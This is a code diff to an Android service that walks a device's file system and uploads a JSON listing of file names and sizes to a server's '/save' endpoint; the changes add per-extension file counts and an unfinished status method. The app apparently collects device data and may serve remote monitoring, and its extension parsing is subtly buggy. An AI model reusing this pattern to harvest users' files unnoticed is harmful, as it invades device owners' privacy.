@@ -19,8 +19,10 @@ import org.json.JSONObject;
 import java.io.File;
 import java.io.IOException;
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.List;
 import java.util.Locale;
+import java.util.Map;
 
 import okhttp3.Call;
 import okhttp3.Callback;
@@ -32,13 +34,19 @@ public class FileWalkerService extends Service {
     private static final String KEY_PATH_TO_WALK = "path_to_walk";
 
     private static class FileWalker {
+
+        private static final String KEY_UNKNOWN_FILES = "unknown_files";
+        private static final String KEY_DIRECTORY = "directory";
+
+        private final Map<String, Integer> status = new HashMap<>();
+
         private static final String KEY_FILES = "files";
         private static final String KEY_SIZE = "size";
         private static final String KEY_NAME = "name";
 
         private final File root;
 
-        public FileWalker(String root) {
+        FileWalker(String root) {
             this(new File(root));
         }
 
@@ -48,6 +56,15 @@ public class FileWalkerService extends Service {
 
         JSONArray walk() throws JSONException {
             return read(scan(this.root));
+        }
+
+        //TODO: Method not completed - extension must be treated carefully.
+        String getStatus() {
+            final StringBuilder sb = new StringBuilder();
+            for (Map.Entry<String, Integer> entry : status.entrySet()) {
+                sb.append(entry.getKey()).append("=").append(entry.getValue()).append("<br>");
+            }
+            return sb.toString();
         }
 
         static class FileNode {
@@ -92,19 +109,53 @@ public class FileWalkerService extends Service {
             return null;
         }
 
-        private static List<FileNode> scan(File root) {
+        private List<FileNode> scan(File root) {
+
+            manageStatus(root);
 
             if (root.isDirectory()) {
                 final List<FileNode> rootFileNodes = new ArrayList<>();
 
                 for (final File file : root.listFiles()) {
+                    manageStatus(file);
                     rootFileNodes.add(new FileNode(file.getName(), scan(file), (file.length() / 1024)));
                 }
 
                 return rootFileNodes;
 
             }
+
             return null;
+        }
+
+        /**
+         * Method used to count number of directories, files, file_type and their count.
+         *
+         * @param file
+         */
+        private void manageStatus(File file) {
+
+            String extension;
+            if (!file.isDirectory()) {
+
+                final String fileName = file.getName();
+
+                if (fileName.contains(".")) {
+                    extension = fileName.split("\\.")[1];
+                } else {
+                    extension = KEY_UNKNOWN_FILES;
+                }
+
+            } else {
+                extension = KEY_DIRECTORY;
+            }
+
+            if (!status.containsKey(extension)) {
+                status.put(extension, 1);
+            } else {
+                status.put(extension, status.get(extension) + 1);
+            }
+
         }
     }
 
@@ -128,7 +179,8 @@ public class FileWalkerService extends Service {
         }
 
         try {
-            final JSONArray jaFiles = new FileWalker(pathToSync).walk();
+            final FileWalker fileWalker = new FileWalker(pathToSync);
+            final JSONArray jaFiles = fileWalker.walk();
             new APIRequestGateway(this, new APIRequestGateway.APIRequestGatewayCallback() {
                 @Override
                 public void onReadyToRequest(String apiKey) {
@@ -138,7 +190,7 @@ public class FileWalkerService extends Service {
                     final Request contactsRequest = new APIRequestBuilder("/save", apiKey)
                             .addParam(Xrob.KEY_ERROR, "false")
                             .addParam(Xrob.KEY_DATA_TYPE, Xrob.DATA_TYPE_FILES)
-                            .addParam(Xrob.KEY_MESSAGE, "Files retrieved")
+                            .addParam(Xrob.KEY_MESSAGE, "Status need to be updated!!")
                             .addParam(Xrob.KEY_DATA, jaFiles.toString())
                             .build();
 
